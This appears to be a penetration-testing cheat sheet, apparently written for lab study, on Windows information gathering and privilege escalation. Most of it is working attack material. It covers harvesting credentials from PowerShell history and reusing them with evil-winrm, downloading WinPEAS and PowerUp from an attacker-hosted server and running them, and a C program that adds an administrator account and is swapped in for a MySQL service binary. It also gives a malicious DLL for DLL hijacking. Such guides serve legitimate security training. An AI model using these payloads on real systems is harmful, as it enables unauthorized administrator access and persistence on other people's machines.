# Information Gathering

## Installed applications
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```



## Find the path of a running process


https://superuser.com/questions/768984/show-exe-file-path-of-running-processes-on-the-command-line-in-windows
```

PS C:\Users\mac> Get-Process NonStandardProcess

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     79       8    11912       1608       6.14   1792   0 NonStandardProcess


PS C:\Users\mac> Get-Process NonStandardProcess | Format-List Path


Path : C:\Users\mac\AppData\Roaming\SuperCompany\NonStandardProcess.exe



PS C:\Users\mac> cd C:\Users\mac\AppData\Roaming\SuperCompany
PS C:\Users\mac\AppData\Roaming\SuperCompany> dir


    Directory: C:\Users\mac\AppData\Roaming\SuperCompany


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/16/2026  12:22 PM             38 flag.txt
-a----        11/15/2022   8:32 AM        1323008 NonStandardProcess.exe


PS C:\Users\mac\AppData\Roaming\SuperCompany> type flag.txt
OS{dbf6f787909a715d9d1a4767fc7a2a89}
PS C:\Users\mac\AppData\Roaming\SuperCompany>

```

Get noteworthy files:
`Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue` 

Get flag file:
`Get-ChildItem -Path C:\Users\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue` 

## Find Powershell History
```powershell
Get-History
```
If not cleared this will output last commands executed in the current PowerShell session. To find the history of commands executed in previous sessions, you can check the PowerShell history file, which is typically located at:
```powershell
(Get-PSReadlineOption).HistorySavePath
```

Wich you can read with:
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### Creds in PowerShell History
If you find any credentials in the PowerShell history, you can use them to escalate privileges
Example what you'll find in the history:

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

This is also called powershell remoting, which allows you to run commands on a remote machine. If you have the credentials, you can use them to access the remote machine and potentially escalate privileges.

Linux tool for it is called `evil-winrm`, which allows you to connect to a Windows machine using the WinRM protocol. You can use it to execute commands on the remote machine and potentially escalate privileges if you have valid credentials.
```bash
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

## Windows Enumeration WinPEAS
WinPEAS is a script that enumerates common Windows privilege escalation vectors. It can be run on a Windows machine to gather information about the system, installed software, services, and potential misconfigurations that could be exploited for privilege escalation.
```bash
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

### Copy it to your target machine and run it:
```powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
```
```powershell
.\winPEAS.exe
```

WinPeas will output a lot of information, including potential privilege escalation vectors, such as weak permissions, unquoted service paths, and more.

Other options for Windows enumeration include
PowerUp, but it is not maintained anymore. You can find it here:
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

## Privesc Windows
Use PowerUp to find potential privilege escalation vectors on Windows systems. 

```powershell
iwr -uri https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
```
Import the PowerUp module and run the enumeration functions to identify misconfigurations and vulnerabilities that could be exploited for privilege escalation.

```powershell
. .\PowerUp.ps1
```
Get a list of all services and their properties, including the binary path, to identify potential misconfigurations.
```powershell
Get-ModifiableServiceFile    
```
PowerUp will also suggest potential privilege escalation vectors based on the findings.
```powershell
Install-ServiceBinary -Name LaDEEDah
```

### Replace the binary of a service with a malicious one to escalate privileges. 
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
Compile it with:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Then you can copy the binary to the target machine and replace the binary of a service with it. When the service is restarted, it will execute your malicious binary, adding a new user with administrative privileges.
```powershell
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
Try to stop the service and start it again to trigger the execution of your malicious binary.
```powershell
net stop mysql
net start mysql
```
If you cant stop the service, you can try to restart the machine to trigger the execution of your malicious binary.
```powershell
shutdown /r /t 0
```

## Run application as a specific user using `runas` command
The `runas` command allows you to run a program as a different user. 

```powershell
runas /user:Administrator "C:\Path\To\Application.exe"
```

## DLL Hijacking
Thanks to DLL Searchorder you can hijack a DLL that is loaded by a program. If you can place a malicious DLL in the same directory as the executable, it will be loaded instead of the legitimate one.

Oder of searching for DLLs in Windows:
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Windows first searches the application's directory. Interestingly, the current directory is at position 5. When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.

### Create dll to add a user
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Compile it with:
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```